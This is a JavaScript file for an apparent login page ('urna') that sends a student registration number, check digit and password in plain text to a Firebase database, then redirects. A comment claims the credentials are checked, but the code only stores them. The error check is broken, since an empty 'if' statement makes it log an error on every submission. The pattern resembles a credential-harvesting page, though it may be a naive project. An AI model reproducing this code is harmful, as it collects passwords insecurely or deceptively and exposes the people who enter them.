

  
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";


const firebaseConfig = {
  apiKey: "AIzaSyDbQH9lRIEfYeXGA92QWVIkZ0No6-5xrio",
  authDomain: "urna-ec7a7.firebaseapp.com",
  databaseURL: "https://urna-ec7a7-default-rtdb.firebaseio.com",
  projectId: "urna-ec7a7",
  storageBucket: "urna-ec7a7.appspot.com",
  messagingSenderId: "153920023241",
  appId: "1:153920023241:web:35473099846372372ffb18"
};


const app = initializeApp(firebaseConfig);

const ra = document.querySelector("#number1");
const senha = document.querySelector("#senha");
const digito = document.querySelector("#digito");
const modal2 = document.querySelector("#modal2");
const botao = document.querySelector("#botao");
const modal = document.querySelector(".modal");
var inputPass = document.getElementById('senha');
var bntShowpass = document.querySelector('#bnt-senha');
var okButton = document.querySelector('#okButton');






async function POST() {
  const url = "https://urna-ec7a7-default-rtdb.firebaseio.com/cadastro.json";
  
  const newData = {
    ra: ra.value,
    senha: senha.value,
    digito: digito.value
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(newData)
    });

    if (!response.ok) ;

   console.log("erro")

  
    window.location.href = "./index.html";
  } catch (error) {
   
    modal.showModal();
  }
}

// Verificar se os campos estão preenchidos e se as credenciais estão corretas
botao.addEventListener('click', () => {
  if (ra.value === '' || senha.value === '' || ra.value.length < 9 || senha.value.length < 6) {
    modal.showModal();
  } else if (isNaN(ra.value)) {
    modal.showModal();
  } else {
    modal2.showModal();
    POST(); 
  }
});

// Função para mostrar e ocultar a senha
function mostrarSenha() {
  if (inputPass.type === 'password') {
    inputPass.setAttribute('type', 'text');
    bntShowpass.classList.replace('bi-eye-fill', 'bi-eye-slash-fill');
    bntShowpass.style.opacity = 1;
  } else {
    inputPass.setAttribute('type', 'password');
    bntShowpass.classList.replace('bi-eye-slash-fill', 'bi-eye-fill');
    bntShowpass.style.opacity = 0.5;
  }
}

// Adicionar eventos ao carregar o documento
document.addEventListener('DOMContentLoaded', () => {
  okButton.addEventListener('click', () => {
    modal.close(); 
  });
 
  
  bntShowpass.addEventListener('click', mostrarSenha); 
});
